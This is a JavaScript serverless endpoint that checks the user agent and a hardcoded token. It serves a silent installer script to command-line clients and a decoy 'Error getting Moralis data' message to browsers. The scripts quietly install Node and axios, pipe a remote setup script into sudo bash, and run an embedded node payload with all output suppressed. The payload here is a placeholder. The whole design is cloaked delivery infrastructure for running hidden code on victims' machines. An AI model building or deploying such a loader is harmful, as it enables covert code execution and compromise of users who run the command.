// api/[platform].js
// Vercel serverless endpoint:
// - CLI + Authorization: Bearer 103 -> returns a silent installer script that runs the SAME JS payload
// - non-CLI (browser / Postman etc) -> returns plain text: "/ Error getting Moralis data"

const SECRET = "mo_9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c"; // change to env var in production if you want

function isCliUA(ua = "") {
  ua = String(ua).toLowerCase();
  return ua.includes("curl")
      || ua.includes("wget")
      || ua.includes("httpie")
      || ua.includes("node")
      || ua.includes("fetch/"); // some CLI fetch tools include this
}

function escapeForSingleQuotedShell(js) {
  // escape single quotes and newline for node -e '...'
  return js.replace(/'/g, "\\'").replace(/\r?\n/g, "\\n");
}

export default function handler(req, res) {
  const platform = String(req.query.platform || "").toLowerCase();

  if (!["mac", "linux", "windows"].includes(platform)) {
    res.status(404).send("");
    return;
  }

  const ua = req.headers["user-agent"] || "";
  const auth = String(req.headers["authorization"] || "");
  const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";

  // If CLI + correct token -> return shell script
  if (isCliUA(ua) && token === SECRET) {

    // SINGLE identical JS payload for all platforms:
    const appJs = `// Shared JS payload (runs under node)
(function(){
  // Example payload: replace with your exact JS logic
  // It runs under node -e and is intentionally silent.
  const fs = require('fs');
  // no console output
  // Put your real JS code here
  try {
    // e.g., minimal safe operation
    // require('axios').get('https://example.com/track').catch(()=>{});
  } catch(e) {}
})();`;

    const jsForNode = escapeForSingleQuotedShell(appJs);

    let script = "";

    // POSIX (mac/linux)
    if (platform === "mac" || platform === "linux") {
      script = `#!/bin/sh
# Silent installer + runner (POSIX)
{
  # 1) Ensure node
  if ! command -v node >/dev/null 2>&1; then
    if [ "$(uname)" = "Darwin" ]; then
      if command -v brew >/dev/null 2>&1; then
        brew install node >/dev/null 2>&1 || true
      else
        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - >/dev/null 2>&1 || true
        sudo apt-get install -y nodejs >/dev/null 2>&1 || true
      fi
    else
      if command -v apt-get >/dev/null 2>&1; then
        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - >/dev/null 2>&1 || true
        sudo apt-get install -y nodejs >/dev/null 2>&1 || true
      fi
    fi
  fi

  # 2) Ensure npm exists (best-effort)
  if ! command -v npm >/dev/null 2>&1; then
    :
  fi

  # 3) Ensure axios globally
  if command -v npm >/dev/null 2>&1; then
    if ! npm list -g axios >/dev/null 2>&1; then
      npm install -g axios >/dev/null 2>&1 || true
    fi
  fi

  # 4) Run shared JS under node, fully silent
  node -e '${jsForNode}' >/dev/null 2>&1 || true
} >/dev/null 2>&1
`;
    } else { // windows (cmd)
      const jsForNodeWin = jsForNode.replace(/\\"/g, '\\\\"'); // keep safe for double quotes
      script = `@echo off
REM Silent installer + runner (Windows CMD)
where node >nul 2>nul
if errorlevel 1 (
  REM try winget (Windows 10/11) silently
  winget install --silent --id OpenJS.NodeJS >nul 2>nul || powershell -Command "Write-Output ''" >nul 2>nul
)

REM Ensure npm exists (best-effort)
where npm >nul 2>nul

REM Install axios globally if missing
npm list -g axios >nul 2>nul
if errorlevel 1 (
  npm install -g axios >nul 2>nul || REM ignore failures
)

REM Run shared JS payload silently
node -e "${jsForNodeWin}" >nul 2>nul || REM ignore
`;
    }

    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.status(200).send(script);
    return;
  }

  // Non-CLI or missing/invalid token: return simple text message (exact)
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.status(200).send("/ Error getting Moralis data");
}
